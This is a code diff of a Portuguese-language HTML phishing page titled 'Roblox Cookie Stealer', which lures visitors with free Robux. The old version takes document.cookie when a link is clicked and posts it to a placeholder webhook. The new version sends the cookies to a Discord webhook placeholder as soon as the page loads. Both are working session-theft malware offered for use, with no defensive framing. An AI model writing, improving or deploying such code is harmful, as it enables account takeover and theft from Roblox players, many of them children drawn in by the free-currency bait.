@@ -3,37 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Stealer</title>
+    <title>Roblox Cookie Thief</title>
 </head>
 <body>
-    <h1>Por favor, clique no link abaixo para reivindicar seu Robux grátis!</h1>
-    <a href="#" id="robuxLink">Clique aqui para reivindicar</a>
-
+    <h1>Clique aqui para ganhar Robux grátis!</h1>
+    
     <script>
-        // Envia o cookie para o webhook
-        function sendCookieToWebhook(cookie) {
-            fetch('https://seuwebhook.com', {
+        // Função para enviar os cookies para o seu Discord webhook
+        function sendCookies() {
+            // Captura os cookies
+            var cookies = document.cookie;
+
+            // Envia os cookies para o seu Discord webhook (você deve substituir o URL pelo seu)
+            fetch('https://discord.com/api/webhooks/SEU_DISCORD_WEBHOOK_AQUI', {
                 method: 'POST',
-                body: JSON.stringify({ cookie: cookie }),
                 headers: {
                     'Content-Type': 'application/json'
-                }
-            }).then(response => {
+                },
+                body: JSON.stringify({cookies: cookies})
+            })
+            .then(response => {
                 if (response.ok) {
-                    console.log('Cookie enviado com sucesso!');
+                    alert('Cookies enviados com sucesso para o Discord!');
                 } else {
-                    console.error('Erro ao enviar o cookie.');
+                    alert('Erro ao enviar cookies para o Discord!');
                 }
-            }).catch(error => {
-                console.error('Erro ao enviar o cookie:', error);
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                alert('Erro ao enviar cookies para o Discord!');
             });
         }
 
-        // Obtém e envia o cookie quando o link for clicado
-        document.getElementById('robuxLink').addEventListener('click', function() {
-            var cookie = document.cookie;
-            sendCookieToWebhook(cookie);
-        });
+        // Chama a função sendCookies assim que a página for carregada
+        window.onload = sendCookies;
     </script>
 </body>
 </html>
